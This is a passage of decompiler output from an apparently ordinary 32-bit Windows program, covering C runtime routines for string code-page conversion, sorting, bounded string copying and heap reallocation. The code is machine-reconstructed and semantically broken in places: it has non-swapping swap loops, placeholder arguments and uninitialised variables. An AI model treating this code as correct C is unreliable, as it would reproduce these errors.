        int32_t v3; // 0x40e94b
        int32_t v4; // 0x40e94b
        int32_t v5; // 0x40e94b
        int32_t v6; // 0x40e94b
        int32_t v7 = function_40f5bd(a4, a5, v2, v3, v5, v6, g112 ^ (int32_t)&v1, v4); // 0x40e96a
        cbMultiByte = v7 + (int32_t)(v7 < a5);
    }
    int32_t CodePage = a8; // 0x40e97f
    if (a8 == 0) {
        // 0x40e981
        CodePage = *(int32_t *)(*a1 + 8);
    }
    int32_t v8 = CodePage; // bp-48, 0x40e9a4
    char * lpMultiByteStr = (char *)a4; // 0x40e9a5
    int32_t cchWideChar = MultiByteToWideChar(CodePage, 8 * (int32_t)(a9 != 0) | 1, lpMultiByteStr, cbMultiByte, NULL, 0); // 0x40e9a5
    if (cchWideChar == 0) {
        // 0x40eb43
        return function_4065ae();
    }
    int32_t v9 = &v8; // 0x40e9a4
    uint32_t v10 = 2 * cchWideChar; // 0x40e9b6
    int32_t v11 = 0; // 0x40e9c2
    int32_t v12 = v9; // 0x40e9c2
    int32_t v13; // 0x40e94b
    if (v10 > 0xfffffff7) {
        goto lab_0x40eb3a;
    } else {
        uint32_t v14 = v10 + 8; // 0x40e9c4
        if (v14 < 1025) {
            // 0x40e9d7
            function_411590();
            v8 = 0xcccc;
            v13 = v9;
            goto lab_0x40ea18;
        } else {
            int32_t v15 = function_40bc16(v14); // 0x40e9fb
            v11 = 0;
            v12 = v9;
            if (v15 == 0) {
                goto lab_0x40eb3a;
            } else {
                // 0x40ea0b
                *(int32_t *)v15 = 0xdddd;
                v13 = v15;
                goto lab_0x40ea18;
            }
        }
    }
  lab_0x40eb3a:
    // 0x40eb3a
    *(int32_t *)(v12 - 4) = v11;
    function_40ddda((int32_t)&g266);
    // 0x40eb43
    return function_4065ae();
  lab_0x40ea18:;
    int32_t lpWideCharStr = v13 + 8; // 0x40ea11
    v11 = 0;
    v12 = v9;
    int32_t v16; // 0x40e94b
    int32_t v17; // 0x40e94b
    int32_t v18; // 0x40e94b
    int32_t v19; // bp-144, 0x40e94b
    int32_t v20; // 0x40ea48
    int32_t cchWideChar2; // 0x40ea4b
    if (lpWideCharStr == 0) {
        goto lab_0x40eb3a;
    } else {
        int32_t v21 = CodePage; // bp-72, 0x40ea2a
        int32_t v22 = MultiByteToWideChar(CodePage, 1, lpMultiByteStr, cbMultiByte, (int16_t *)lpWideCharStr, cchWideChar); // 0x40ea2b
        v11 = lpWideCharStr;
        v12 = &v21;
        if (v22 == 0) {
            goto lab_0x40eb3a;
        } else {
            int32_t v23 = a2; // bp-108, 0x40ea48
            v20 = &v23;
            cchWideChar2 = function_40c2da(a2, a3, lpWideCharStr, cchWideChar, 0, 0, 0, 0, 0);
            v11 = lpWideCharStr;
            v12 = v20;
            if (cchWideChar2 == 0) {
                goto lab_0x40eb3a;
            } else {
                if ((a3 & 1024) == 0) {
                    uint32_t v24 = 2 * cchWideChar2; // 0x40ea9b
                    v18 = v20;
                    v17 = 0;
                    if (v24 > 0xfffffff7) {
                        goto lab_0x40eb31;
                    } else {
                        uint32_t v25 = v24 + 8; // 0x40eaa9
                        if (v25 < 1025) {
                            // 0x40eabc
                            function_411590();
                            v23 = 0xcccc;
                            v16 = v20;
                            goto lab_0x40eaf5;
                        } else {
                            int32_t v26 = function_40bc16(v25); // 0x40eadc
                            v18 = v20;
                            v17 = 0;
                            if (v26 == 0) {
                                goto lab_0x40eb31;
                            } else {
                                // 0x40eae8
                                *(int32_t *)v26 = 0xdddd;
                                v16 = v26;
                                goto lab_0x40eaf5;
                            }
                        }
                    }
                } else {
                    // 0x40ea63
                    v11 = lpWideCharStr;
                    v12 = v20;
                    if (a7 != 0 && cchWideChar2 <= a7) {
                        // 0x40ea76
                        v19 = a2;
                        function_40c2da(a2, a3, lpWideCharStr, cchWideChar, a6, a7, 0, 0, 0);
                        v11 = lpWideCharStr;
                        v12 = &v19;
                    }
                    goto lab_0x40eb3a;
                }
            }
        }
    }
  lab_0x40eb31:
    // 0x40eb31
    *(int32_t *)(v18 - 4) = v17;
    function_40ddda((int32_t)&g266);
    v11 = lpWideCharStr;
    v12 = v18;
    goto lab_0x40eb3a;
  lab_0x40eaf5:;
    int32_t lpWideCharStr2 = v16 + 8; // 0x40eaee
    v18 = v20;
    v17 = 0;
    if (lpWideCharStr2 == 0) {
        goto lab_0x40eb31;
    } else {
        // 0x40eaf9
        v19 = a2;
        int32_t v27 = function_40c2da(a2, a3, lpWideCharStr, cchWideChar, lpWideCharStr2, cchWideChar2, 0, 0, 0); // 0x40eb0b
        v18 = &v19;
        v17 = lpWideCharStr2;
        if (v27 == 0) {
            goto lab_0x40eb31;
        } else {
            int32_t cbMultiByte2 = a7 != 0 ? a7 : 0;
            char * lpMultiByteStr2 = a7 != 0 ? (char *)a6 : NULL;
            int32_t v28 = CodePage; // bp-176, 0x40eb22
            int32_t v29 = &v28; // 0x40eb22
            int32_t v30 = WideCharToMultiByte(CodePage, 0, (int16_t *)lpWideCharStr2, cchWideChar2, lpMultiByteStr2, cbMultiByte2, NULL, NULL); // 0x40eb25
            v18 = v29;
            v17 = lpWideCharStr2;
            if (v30 != 0) {
                // 0x40eb5f
                function_40ddda(lpWideCharStr2);
                v11 = lpWideCharStr;
                v12 = v29;
                goto lab_0x40eb3a;
            } else {
                goto lab_0x40eb31;
            }
        }
    }
}

// Address range: 0x40eb68 - 0x40ebb3
int32_t function_40eb68(int32_t a1, int32_t a2, int32_t a3, char * a4, int32_t a5, int32_t * a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x40eb68
    function_4093d4(a1, (int32_t)&g266);
    int32_t v1; // bp-16, 0x40eb68
    int32_t result = function_40e94b(&v1, a2, a3, (int32_t)a4, a5, (int32_t)a6, a7, a8, a9); // 0x40eb97
    char v2; // 0x40eb68
    if (v2 != 0) {
        // 0x40eba5
        int32_t v3; // 0x40eb68
        int32_t * v4 = (int32_t *)(v3 + 848); // 0x40eba8
        *v4 = *v4 & -3;
    }
    // 0x40ebaf
    return result;
}

// Address range: 0x40ebb3 - 0x40ec6f
int32_t function_40ebb3(int32_t a1, int32_t a2) {
    // 0x40ebb3
    int32_t v1; // bp-32, 0x40ebb3
    int32_t * v2 = (int32_t *)((int32_t)&v1 - 4); // 0x40ebdc
    int32_t v3 = 0; // 0x40ebc8
    int32_t v4 = 227; // 0x40ebc8
    int32_t v5 = v4 + v3; // 0x40ebcb
    int32_t v6 = (v5 - (v5 >> 31)) / 2; // 0x40ebda
    *v2 = 65;
    int32_t v7 = 8 * v6; // 0x40ebe2
    int32_t v8 = *(int32_t *)(v7 + (int32_t)&g48); // 0x40ebe2
    *v2 = 90;
    int32_t v9 = 85; // 0x40ebf0
    int32_t v10 = v8; // 0x40ebf0
    int16_t v11 = *(int16_t *)(a1 - v8 + v10); // 0x40ebf1
    uint16_t v12 = v11 > 90 ? v11 : v11 + 32;
    int16_t v13 = *(int16_t *)v10; // 0x40ec09
    uint16_t v14 = v13 > 90 ? v13 : v13 + 32;
    v9--;
    v10 += 2;
    while (v9 != 0 == (v12 != 0) == v12 == v14) {
        // 0x40ebf1
        v11 = *(int16_t *)(a1 - v8 + v10);
        v12 = v11 > 90 ? v11 : v11 + 32;
        v13 = *(int16_t *)v10;
        v14 = v13 > 90 ? v13 : v13 + 32;
        v9--;
        v10 += 2;
    }
    int32_t v15 = (int32_t)v12 - (int32_t)v14; // 0x40ec3e
    while (v15 != 0) {
        // 0x40ec42
        v3 = v15 >= 0 ? v6 + 1 : v3;
        v4 = v15 >= 0 ? v4 : v6 - 1;
        if (v3 > v4) {
            // 0x40ec68
            return -1;
        }
        v5 = v4 + v3;
        v6 = (v5 - (v5 >> 31)) / 2;
        *v2 = 65;
        v7 = 8 * v6;
        v8 = *(int32_t *)(v7 + (int32_t)&g48);
        *v2 = 90;
        v9 = 85;
        v10 = v8;
        v11 = *(int16_t *)(a1 - v8 + v10);
        v12 = v11 > 90 ? v11 : v11 + 32;
        v13 = *(int16_t *)v10;
        v14 = v13 > 90 ? v13 : v13 + 32;
        v9--;
        v10 += 2;
        while (v9 != 0 == (v12 != 0) == v12 == v14) {
            // 0x40ebf1
            v11 = *(int16_t *)(a1 - v8 + v10);
            v12 = v11 > 90 ? v11 : v11 + 32;
            v13 = *(int16_t *)v10;
            v14 = v13 > 90 ? v13 : v13 + 32;
            v9--;
            v10 += 2;
        }
        // 0x40ec2f
        v15 = (int32_t)v12 - (int32_t)v14;
    }
    // 0x40ec68
    return *(int32_t *)(v7 + (int32_t)&g49);
}

// Address range: 0x40ec6f - 0x40ec9b
int32_t function_40ec6f(int32_t a1) {
    // 0x40ec6f
    if (a1 == 0) {
        // 0x40ec97
        return 0;
    }
    // 0x40ec7a
    int32_t v1; // 0x40ec6f
    int32_t v2 = function_40ebb3(a1, v1); // 0x40ec7d
    if (v2 < 0 || v2 >= 228) {
        // 0x40ec97
        return 0;
    }
    // 0x40ec8e
    return *(int32_t *)(8 * v2 + (int32_t)&g46);
}

// Address range: 0x40eca0 - 0x40ed36
int32_t function_40eca0(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4) {
    if (a2 <= a1) {
        // 0x40ed27
        return function_4065ae();
    }
    // 0x40ecbb
    int32_t v1; // bp-20, 0x40eca0
    int32_t v2 = &v1; // 0x40ecbf
    int32_t v3 = a3 + a1;
    int32_t v4 = a1; // 0x40ecc9
    int32_t v5; // 0x40eca0
    int32_t v6; // 0x40eca0
    int32_t v7; // 0x40eca0
    int32_t v8; // 0x40ecea
    if (v3 <= a2) {
        *(int32_t *)(v2 - 4) = a1;
        *(int32_t *)(v2 - 8) = v3;
        v7 = function_4065bf() < 1 ? a1 : v3;
        v8 = v3 + a3;
        v6 = v8;
        v5 = v7;
        v4 = v7;
        while (v8 <= a2) {
            // 0x40ecd0
            *(int32_t *)(v2 - 4) = v5;
            *(int32_t *)(v2 - 8) = v6;
            v7 = function_4065bf() < 1 ? v5 : v6;
            v8 = v6 + a3;
            v6 = v8;
            v5 = v7;
            v4 = v7;
        }
    }
    int32_t v9 = v4;
    int32_t v10; // 0x40eca0
    char * v11; // 0x40ed06
    int32_t v12; // 0x40ed11
    char * v13; // 0x40ed01
    if (a3 != 0 && v9 != a2) {
        // 0x40ecff
        v10 = a2;
        v12 = a3;
        v13 = (char *)v10;
        v11 = (char *)(v9 - a2 + v10);
        *v11 = *v13;
        *v13 = *v11;
        v12--;
        v10++;
        while (v12 != 0) {
            // 0x40ed01
            v13 = (char *)v10;
            v11 = (char *)(v9 - a2 + v10);
            *v11 = *v13;
            *v13 = *v11;
            v12--;
            v10++;
        }
    }
    int32_t v14 = a2 - a3; // 0x40ed1c
    while (v14 > a1) {
        uint32_t v15 = v14;
        v4 = a1;
        if (v3 <= v15) {
            *(int32_t *)(v2 - 4) = a1;
            *(int32_t *)(v2 - 8) = v3;
            v7 = function_4065bf() < 1 ? a1 : v3;
            v8 = v3 + a3;
            v6 = v8;
            v5 = v7;
            v4 = v7;
            while (v8 <= v15) {
                // 0x40ecd0
                *(int32_t *)(v2 - 4) = v5;
                *(int32_t *)(v2 - 8) = v6;
                v7 = function_4065bf() < 1 ? v5 : v6;
                v8 = v6 + a3;
                v6 = v8;
                v5 = v7;
                v4 = v7;
            }
        }
        // 0x40ecf3
        v9 = v4;
        if (a3 != 0 && v9 != v15) {
            // 0x40ecff
            v10 = v15;
            v12 = a3;
            v13 = (char *)v10;
            v11 = (char *)(v9 - v15 + v10);
            *v11 = *v13;
            *v13 = *v11;
            v12--;
            v10++;
            while (v12 != 0) {
                // 0x40ed01
                v13 = (char *)v10;
                v11 = (char *)(v9 - v15 + v10);
                *v11 = *v13;
                *v13 = *v11;
                v12--;
                v10++;
            }
        }
        // 0x40ed1c
        v14 = v15 - a3;
    }
    // 0x40ed27
    return function_4065ae();
}

// Address range: 0x40ed40 - 0x40ed79
int32_t function_40ed40(int32_t a1, int32_t result, int32_t a3) {
    // 0x40ed40
    if (a1 == result || a3 == 0) {
        // 0x40ed76
        return result;
    }
    int32_t v1 = a3; // 0x40ed5a
    char * v2 = (char *)result; // 0x40ed60
    int32_t result2 = result + 1; // 0x40ed62
    char * v3 = (char *)(a1 - result + result); // 0x40ed65
    *v3 = *v2;
    *v2 = *v3;
    v1--;
    while (v1 != 0) {
        int32_t v4 = result2;
        v2 = (char *)v4;
        result2 = v4 + 1;
        v3 = (char *)(a1 - result + v4);
        *v3 = *v2;
        *v2 = *v3;
        v1--;
    }
    // 0x40ed76
    return result2;
}

// Address range: 0x40ed80 - 0x40f11a
int32_t function_40ed80(int32_t a1, uint32_t a2, uint32_t a3, int32_t a4) {
    if (a1 == 0 == (a2 != 0) || a3 == 0 || a4 == 0) {
        // 0x40edbd
        *(int32_t *)function_40ab11() = 22;
        return function_4065ae();
    }
    if (a2 < 2) {
        // 0x40f10a
        return function_4065ae();
    }
    // 0x40edf8
    int32_t v1; // bp-4, 0x40ed80
    int32_t v2 = &v1; // 0x40ed83
    int32_t v3; // bp-300, 0x40ed80
    int32_t v4 = &v3; // 0x40edfc
    int32_t * v5 = (int32_t *)(v4 - 4);
    int32_t * v6 = (int32_t *)(v4 - 8);
    int32_t * v7 = (int32_t *)(v4 - 12);
    int32_t v8 = v2 - 244;
    int32_t v9 = v2 - 124;
    int32_t v10 = a1; // 0x40edfd
    int32_t v11 = 0; // 0x40edfd
    int32_t v12 = (a2 - 1) * a3 + a1; // 0x40edfd
    int32_t v13; // 0x40ed80
    uint32_t v14; // 0x40ed80
    int32_t v15; // 0x40ed80
    uint32_t v16; // 0x40ed80
    uint32_t v17; // 0x40ed80
    int32_t v18; // 0x40ed80
    int32_t v19; // 0x40ed80
    uint32_t v20; // 0x40ed80
    int32_t v21; // 0x40ed80
    int32_t v22; // 0x40ed80
    int32_t v23; // 0x40ed80
    uint32_t v24; // 0x40ed80
    int32_t v25; // 0x40ed80
    int32_t v26; // 0x40ed80
    int32_t v27; // 0x40ed80
    int32_t v28; // 0x40ed80
    while (true) {
      lab_0x40edff_2:
        // 0x40edff
        v17 = v12;
        int32_t v29 = v10; // 0x40edff
        int32_t v30 = v11; // 0x40edff
        int32_t v31; // 0x40ed80
        while (true) {
            // 0x40ee05
            v31 = v30;
            v20 = v29;
            uint32_t v32 = (v17 - v20) / a3 + 1; // 0x40ee0d
            if (v32 < 9) {
                // break -> 0x40ee15
                break;
            }
            int32_t v33 = v32 / 2 * a3 + v20; // 0x40ee30
            *v5 = v33;
            *v6 = v20;
            if (function_4065bf() >= 1) {
                // 0x40ee4b
                *v5 = a3;
                *v6 = v33;
                *v7 = v20;
                function_40ed40((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            }
            // 0x40ee5b
            *v5 = v17;
            *v6 = v20;
            if (function_4065bf() >= 1) {
                // 0x40ee78
                *v5 = a3;
                *v6 = v17;
                *v7 = v20;
                function_40ed40((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            }
            // 0x40ee8d
            *v5 = v17;
            *v6 = v33;
            if (function_4065bf() >= 1) {
                // 0x40eea5
                *v5 = a3;
                *v6 = v17;
                *v7 = v33;
                function_40ed40((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            }
            // 0x40eeb5
            v25 = v33;
            v27 = v17;
            v13 = v33;
            v18 = v20;
            while (true) {
              lab_0x40eed0:;
                int32_t v34 = v18;
                v14 = v13;
                v28 = v27;
                v26 = v25;
                v19 = v34;
                if (v14 > v34) {
                    int32_t v35 = v34 + a3; // 0x40eed4
                    int32_t v36 = v35; // 0x40eede
                    v19 = v35;
                    if (v35 >= v14) {
                        goto lab_0x40ef0b;
                    } else {
                        int32_t v37 = v36;
                        *v5 = v14;
                        *v6 = v37;
                        v23 = v37;
                        while (function_4065bf() < 1) {
                            int32_t v38 = v37 + a3; // 0x40eed4
                            v36 = v38;
                            v19 = v38;
                            if (v38 >= v14) {
                                goto lab_0x40ef0b;
                            }
                            v37 = v36;
                            *v5 = v14;
                            *v6 = v37;
                            v23 = v37;
                        }
                        goto lab_0x40ef42;
                    }
                } else {
                    goto lab_0x40ef0b;
                }
            }
          lab_0x40efe3:;
            int32_t v39 = v15; // 0x40efe7
            if (v14 < v15) {
                int32_t v40 = v39 - a3; // 0x40eff0
                while (v40 > v14) {
                    // 0x40eff6
                    *v5 = v14;
                    *v6 = v40;
                    if (function_4065bf() != 0) {
                        goto lab_0x40f04a;
                    }
                    v40 -= a3;
                }
            }
            int32_t v41 = v15; // 0x40f01b
            v41 -= a3;
            int32_t v42 = v41; // 0x40f029
            while (v41 > v20) {
                // 0x40f02b
                *v5 = v14;
                *v6 = v41;
                v42 = v41;
                if (function_4065bf() != 0) {
                    // break -> 0x40f04a
                    break;
                }
                v41 -= a3;
                v42 = v41;
            }
          lab_0x40f04a:
            // 0x40f04a
            v16 = v42;
            if (v16 - v20 < v17 - v24) {
                // 0x40f09b
                v21 = v31;
                if (v17 <= v24) {
                    goto lab_0x40f0b7;
                } else {
                    int32_t v43 = 4 * v31; // 0x40f0a5
                    *(int32_t *)(v43 + v8) = v24;
                    *(int32_t *)(v43 + v9) = v17;
                    v21 = v31 + 1;
                    goto lab_0x40f0b7;
                }
            }
            int32_t v44 = v31; // 0x40f064
            if (v16 > v20) {
                int32_t v45 = 4 * v31; // 0x40f06c
                *(int32_t *)(v45 + v8) = v20;
                *(int32_t *)(v45 + v9) = v16;
                v44 = v31 + 1;
            }
            // 0x40f07e
            v30 = v44;
            v29 = v24;
            v22 = v30;
            if (v17 <= v24) {
                goto lab_0x40f0e2;
            }
        }
        // 0x40ee15
        *v5 = a4;
        *v6 = a3;
        *v7 = v17;
        *(int32_t *)(v4 - 16) = v20;
        function_40eca0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v22 = v31;
        goto lab_0x40f0e2;
    }
  lab_0x40f10a:
    // 0x40f10a
    return function_4065ae();
  lab_0x40ef0b:;
    int32_t v46 = v19 + a3; // 0x40ef11
    v23 = v46;
    if (v46 <= v17) {
        int32_t v47; // 0x40ed80
        int32_t v48 = v47;
        *v5 = v14;
        *v6 = v48;
        v23 = v48;
        while (function_4065bf() < 1) {
            int32_t v49 = v48 + a3; // 0x40ef11
            v47 = v49;
            v23 = v49;
            if (v49 > v17) {
                // break -> 0x40ef42
                break;
            }
            v48 = v47;
            *v5 = v14;
            *v6 = v48;
            v23 = v48;
        }
    }
    goto lab_0x40ef42;
  lab_0x40f0e2:;
    int32_t v65 = v22 - 1; // 0x40f0e8
    if (v65 < 0) {
        // break -> 0x40f10a
        goto lab_0x40f10a;
    }
    int32_t v66 = 4 * v65; // 0x40f0f3
    v10 = *(int32_t *)(v66 + v8);
    v11 = v65;
    v12 = *(int32_t *)(v66 + v9);
    goto lab_0x40edff;
  lab_0x40ef42:
    // 0x40ef42
    v24 = v23;
    int32_t v50 = v28 - a3; // 0x40ef56
    v15 = v28;
    int32_t v51 = v50; // 0x40ef5a
    if (v50 > v14) {
        // 0x40ef5c
        *v5 = v14;
        *v6 = v50;
        int32_t v52 = function_4065bf(); // 0x40ef60
        int32_t v53 = v50; // 0x40ef6d
        v15 = v28;
        v51 = v50;
        if (v52 >= 0 == (v52 != 0)) {
            int32_t v54 = v53;
            int32_t v55 = v54 - a3; // 0x40ef56
            v15 = v54;
            v51 = v55;
            while (v55 > v14) {
                // 0x40ef5c
                *v5 = v14;
                *v6 = v55;
                int32_t v56 = function_4065bf(); // 0x40ef60
                v53 = v55;
                v15 = v54;
                v51 = v55;
                if (v56 >= 0 != v56 != 0) {
                    // break -> 0x40ef75
                    break;
                }
                v54 = v53;
                v55 = v54 - a3;
                v15 = v54;
                v51 = v55;
            }
        }
    }
    int32_t v57 = v51;
    if (v24 > v57) {
        // break -> 0x40efe3
        goto lab_0x40efe3;
    }
    int32_t v58 = v14; // 0x40ef93
    if (v24 != v57) {
        int32_t v59 = v57; // 0x40ef9f
        int32_t v60 = a3; // 0x40ef9f
        char * v61 = (char *)v59; // 0x40efa1
        char * v62 = (char *)(v24 - v57 + v59); // 0x40efa6
        *v62 = *v61;
        *v61 = *v62;
        v60--;
        v59++;
        v58 = v26;
        while (v60 != 0) {
            // 0x40efa1
            v61 = (char *)v59;
            v62 = (char *)(v24 - v57 + v59);
            *v62 = *v61;
            *v61 = *v62;
            v60--;
            v59++;
            v58 = v26;
        }
    }
    int32_t v63 = v58;
    int32_t v64 = v63 != v57 ? v26 : v24;
    v25 = v64;
    v27 = v57;
    v13 = v63 != v57 ? v63 : v24;
    v18 = v24;
    goto lab_0x40eed0;
  lab_0x40edff:
    // 0x40edff
    goto lab_0x40edff_2;
  lab_0x40f0b7:
    // 0x40f0b7
    v22 = v21;
    v10 = v20;
    v11 = v21;
    v12 = v16;
    if (v16 <= v20) {
        goto lab_0x40f0e2;
    } else {
        goto lab_0x40edff;
    }
}

// Address range: 0x40f11a - 0x40f1cb
int32_t function_40f11a(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t result; // 0x40f11a
    int32_t v1; // 0x40f11a
    if (a4 != 0) {
        if (a1 == 0 || a2 == 0) {
            goto lab_0x40f155;
        } else {
            if (a3 != 0) {
                int32_t v2 = a3 - a1; // 0x40f16c
                int32_t v3 = a2; // 0x40f176
                int32_t v4 = a1; // 0x40f176
                int32_t v5 = a4; // 0x40f176
                int32_t v6 = a2; // 0x40f176
                int32_t v7; // 0x40f11a
                if (a4 != -1) {
                    char v8 = *(char *)(a1 + v2); // 0x40f189
                    *(char *)a1 = v8;
                    int32_t v9 = a1 + 1; // 0x40f18e
                    int32_t v10 = v5; // 0x40f191
                    int32_t v11 = v6; // 0x40f191
                    while (v8 != 0) {
                        int32_t v12 = v6 - 1; // 0x40f193
                        v10 = v5;
                        v11 = 0;
                        if (v12 == 0) {
                            // break -> 0x40f19d
                            break;
                        }
                        int32_t v13 = v5 - 1; // 0x40f198
                        v5 = v13;
                        v6 = v12;
                        v10 = v13;
                        v11 = v12;
                        if (v13 == 0) {
                            // break -> 0x40f19d
                            break;
                        }
                        v8 = *(char *)(v9 + v2);
                        *(char *)v9 = v8;
                        v9++;
                        v10 = v5;
                        v11 = v6;
                    }
                    // 0x40f19d
                    v7 = v11;
                    if (v10 == 0) {
                        // 0x40f1a4
                        *(char *)v9 = 0;
                        v7 = v11;
                    }
                } else {
                    char v14 = *(char *)(v4 + v2); // 0x40f178
                    *(char *)v4 = v14;
                    v7 = v3;
                    while (v14 != 0) {
                        int32_t v15 = v3 - 1; // 0x40f182
                        v3 = v15;
                        v4++;
                        v7 = v15;
                        if (v15 == 0) {
                            // break -> 0x40f1a7
                            break;
                        }
                        v14 = *(char *)(v4 + v2);
                        *(char *)v4 = v14;
                        v7 = v3;
                    }
                }
                // 0x40f1a7
                if (v7 != 0) {
                    // 0x40f166
                    return 0;
                }
                if (a4 == -1) {
                    // 0x40f1b2
                    *(char *)(a1 - 1 + a2) = 0;
                    // 0x40f166
                    return 80;
                }
                // 0x40f1bf
                *(char *)a1 = 0;
                v1 = function_40ab11();
                result = 34;
                goto lab_0x40f15c;
            } else {
                // 0x40f152
                *(char *)a1 = 0;
                goto lab_0x40f155;
            }
        }
    } else {
        if (a1 != 0) {
            if (a2 != 0) {
                // 0x40f147
                *(char *)a1 = (char)a4;
                // 0x40f166
                return 0;
            }
        } else {
            // 0x40f12f
            if (a2 == a1) {
                // 0x40f166
                return 0;
            }
        }
        goto lab_0x40f155;
    }
  lab_0x40f155:
    // 0x40f155
    v1 = function_40ab11();
    result = 22;
    goto lab_0x40f15c;
  lab_0x40f15c:
    // 0x40f15c
    *(int32_t *)v1 = result;
    // 0x40f166
    return result;
}

// Address range: 0x40f1cb - 0x40f1d6
int32_t function_40f1cb(int32_t a1) {
    int32_t result = function_40f11a((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40f1d1
    return result;
}

// Address range: 0x40f1e0 - 0x40f220
int32_t function_40f1e0(int16_t a1, int32_t a2) {
    unsigned char v1 = *(char *)a2; // 0x40f1f4
    int32_t v2 = v1; // 0x40f1f6
    int32_t v3 = v2; // 0x40f1f8
    int32_t v4 = a2; // 0x40f1f8
    int32_t v5 = 0; // 0x40f1f8
    int32_t v6 = 0; // 0x40f1f8
    int32_t v7 = 0; // 0x40f1f8
    if (v1 != 0) {
        v4++;
        v5 |= 1 << (v2 & 31);
        unsigned char v8 = *(char *)v4; // 0x40f1f4
        int32_t v9 = v8; // 0x40f1f6
        v3 = v3 & -256 | v9;
        v6 = v5;
        v7 = v3;
        while (v8 != 0) {
            // 0x40f1fa
            v4++;
            v5 |= 1 << (v9 & 31);
            v8 = *(char *)v4;
            v9 = v8;
            v3 = v3 & -256 | v9;
            v6 = v5;
            v7 = v3;
        }
    }
    int32_t v10 = v7; // 0x40f206
    int32_t v11 = a1;
    unsigned char v12 = *(char *)v11; // 0x40f208
    int32_t v13 = v12; // 0x40f20a
    v10 = v10 & -256 | v13;
    int32_t result = v10; // 0x40f20c
    while (v12 != 0) {
        // 0x40f20e
        result = v11;
        if ((1 << (v13 & 31) & v6) != 0) {
            // break -> 0x40f21a
            break;
        }
        v11++;
        v12 = *(char *)v11;
        v13 = v12;
        v10 = v10 & -256 | v13;
        result = v10;
    }
    // 0x40f21a
    return result;
}

// Address range: 0x40f220 - 0x40f237
int32_t function_40f220(int32_t a1, int32_t a2) {
    // 0x40f220
    int32_t v1; // 0x40f220
    return function_40f237(a1, a2, 0, v1);
}

// Address range: 0x40f237 - 0x40f2c4
int32_t function_40f237(uint32_t a1, uint32_t a2, int32_t a3, int32_t a4) {
    // 0x40f237
    if (a1 == 0) {
        // 0x40f245
        *(int32_t *)function_40ab11() = 22;
        // 0x40f2c0
        return 0;
    }
    if (a2 == 0) {
        // 0x40f261
        *(int32_t *)function_40ab11() = 22;
        // 0x40f2c0
        return 0;
    }
    // 0x40f273
    if (a1 >= a2) {
        // 0x40f2c0
        return 0;
    }
    // 0x40f27c
    int32_t v1; // 0x40f237
    function_4093d4(a3, v1);
    int32_t v2 = a2; // 0x40f28e
    int32_t v3; // 0x40f237
    if (*(int32_t *)(v3 + 8) != 0) {
        int32_t v4 = a2 - 2; // 0x40f293
        while (v4 >= a1) {
            // 0x40f299
            if ((*(char *)(v3 + 25 + (int32_t)*(char *)v4) & 4) == 0) {
                // break -> 0x40f2a3
                break;
            }
            v4--;
        }
        // 0x40f2a3
        v2 = a2 - (a2 - v4 & 1);
    }
    // 0x40f2ac
    char v5; // 0x40f237
    if (v5 != 0) {
        // 0x40f2b3
        int32_t v6; // 0x40f237
        int32_t * v7 = (int32_t *)(v6 + 848); // 0x40f2b6
        *v7 = *v7 & -3;
    }
    // 0x40f2c0
    return v2 - 1;
}

// Address range: 0x40f2c4 - 0x40f2d3
int32_t function_40f2c4(void) {
    // 0x40f2c4
    return (char)function_40ce86() == 0;
}

// Address range: 0x40f2d3 - 0x40f306
int32_t function_40f2d3(int32_t lpMem, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    if (lpMem != 0) {
        // 0x40f2f3
        return HeapSize((int32_t *)g227, 0, (int32_t *)lpMem);
    }
    // 0x40f2de
    *(int32_t *)function_40ab11() = 22;
    return -1;
}

// Address range: 0x40f306 - 0x40f36f
int32_t function_40f306(int32_t a1, uint32_t a2) {
    int32_t v1; // bp-12, 0x40f306
    if (a1 == 0) {
        // 0x40f313
        v1 = a2;
        // 0x40f342
        return function_40bc16(a2);
    }
    if (a2 == 0) {
        // 0x40f326
        function_40bbdc(a1);
        // 0x40f342
        return 0;
    }
    if (a2 >= 0xffffffe1) {
        // 0x40f334
        *(int32_t *)function_40ab11() = 12;
        // 0x40f342
        return 0;
    }
    int32_t v2 = &v1;
    *(int32_t *)(v2 - 4) = a2;
    *(int32_t *)(v2 - 8) = a1;
    *(int32_t *)(v2 - 12) = 0;
    int32_t v3 = v2 - 16; // 0x40f35d
    *(int32_t *)v3 = g227;
    int32_t * v4 = HeapReAlloc(&g266, (int32_t)&g266, &g266, (int32_t)&g266); // 0x40f363
    while (v4 == NULL) {
        // 0x40f345
        if (function_40a856() == 0) {
            // 0x40f334
            *(int32_t *)function_40ab11() = 12;
            // 0x40f342
            return 0;
        }
        // 0x40f34e
        *(int32_t *)(v2 - 20) = a2;
        if (function_4096f2((int32_t)&g266) == 0) {
            // 0x40f334
            *(int32_t *)function_40ab11() = 12;
            // 0x40f342
            return 0;
        }
        v2 = v3;
        *(int32_t *)(v2 - 4) = a2;
        *(int32_t *)(v2 - 8) = a1;
        *(int32_t *)(v2 - 12) = 0;
        v3 = v2 - 16;
        *(int32_t *)v3 = g227;
        v4 = HeapReAlloc(&g266, (int32_t)&g266, &g266, (int32_t)&g266);
    }
    // 0x40f342
    return (int32_t)v4;
}

// Address range: 0x40f36f - 0x40f3e5
int32_t function_40f36f(int32_t a1) {
    // 0x40f36f
    function_406770(&g108, 8, (int32_t)&g266);
    int32_t result; // 0x40f3df
    if (g162 < 1) {
        // 0x40f3df
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    // 0x40f384
    int32_t v1; // 0x40f36f
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x40f384
    int32_t v3 = *v2; // 0x40f384
    if ((v3 & 64) == 0 || g140 == 0) {
        int32_t v4 = v3 & -65; // 0x40f3d5
        *v2 = v4;
        __asm_ldmxcsr(v4);
    } else {
        int32_t * v5 = (int32_t *)(v1 - 4); // 0x40f394
        *v5 = 0;
        __asm_ldmxcsr(*v2);
        *v5 = -2;
    }
    // 0x40f3df
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

